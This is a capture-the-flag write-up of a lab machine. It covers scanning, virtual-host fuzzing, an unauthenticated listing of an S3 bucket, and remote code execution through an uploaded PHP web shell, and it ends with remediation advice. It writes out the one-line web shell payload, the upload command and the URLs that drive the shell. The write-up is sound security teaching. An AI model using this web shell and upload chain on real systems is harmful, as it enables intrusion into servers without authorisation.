## Phase 1: Reconnaissance

An initial network scan was conducted to identify open ports and running services on the target IP address.

nmap -sV -sC 10.129.252.5

**Key Findings:**

* **Port 80 (HTTP):** A standard web server was discovered running on the target.

The domain was mapped in the local `/etc/hosts` file. Initial manual exploration of the web application did not reveal any obvious vulnerabilities, prompting deeper enumeration for hidden infrastructure.

A virtual host (vHost) fuzzing attack was performed using `gobuster` to identify hidden subdomains:

gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt


**Result:** The scan successfully uncovered an `s3` subdomain (e.g., `s3.three.htb` / `s3.thetoppers.htb`), indicating the backend use of Amazon S3-compatible cloud storage.


## Phase 2: Vulnerability Discovery (Cloud Misconfiguration)

The newly discovered `s3` subdomain was added to the `/etc/hosts` file.

To test the security posture of the cloud storage, the AWS Command Line Interface (`awscli`) was utilized to attempt an unauthenticated listing of the bucket's contents:

aws s3 ls --endpoint-url=http://s3.thetoppers.htb s3://thetoppers.htb


**Result:** The server responded with the bucket's contents, revealing standard web directory files (like `.htaccess` and `index.php`). This confirmed a severe misconfiguration: the S3 bucket had **Public Read/Write Access** enabled, and its contents were directly mapped to the live web server's root directory.


## Phase 3: Exploitation (RCE via Web Shell)

Because the bucket allowed unauthenticated write access, a malicious PHP payload was crafted locally to establish a web shell. This payload allows arbitrary system commands to be passed via a URL parameter (`cmd`).

echo '<?php system($_GET["cmd"]); ?>' > shell.php


The AWS CLI was then used to upload (copy) this web shell directly into the vulnerable S3 bucket:

aws s3 cp shell.php s3://thetoppers.htb --endpoint-url=http://s3.thetoppers.htb



## Phase 4: Post-Exploitation

With the web shell successfully uploaded to the web server's root directory, Remote Code Execution (RCE) was achieved by navigating to the payload via a web browser and passing standard Linux commands.

Initial verification of code execution:
`http://thetoppers.htb/shell.php?cmd=whoami`
*(Output confirmed execution as the `www-data` service account).*

Further enumeration was conducted via the web shell to locate the flag:
`http://thetoppers.htb/shell.php?cmd=ls`
`http://thetoppers.htb/shell.php?cmd=cat flag.txt`

**Compromise Complete.**


## Remediation & Defensive Recommendations

To secure this environment against similar attack chains, the following mitigations should be implemented immediately:

1. **Restrict S3 Bucket Policies:** Cloud storage buckets used for web hosting must never allow public write access (`s3:PutObject`). The bucket policy should be strictly configured to allow public read access *only* for necessary static assets, while requiring IAM authentication for any modifications.
2. **Disable Directory Listing:** Ensure that the `s3:ListBucket` permission is restricted to authenticated administrators only, preventing attackers from mapping the backend file structure.
3. **Implement Server-Side Execution Restrictions:** If a bucket is meant to host static files, the web server (e.g., Apache/Nginx) should be configured to prevent the execution of dynamic server-side scripts (like PHP) within that specific directory.
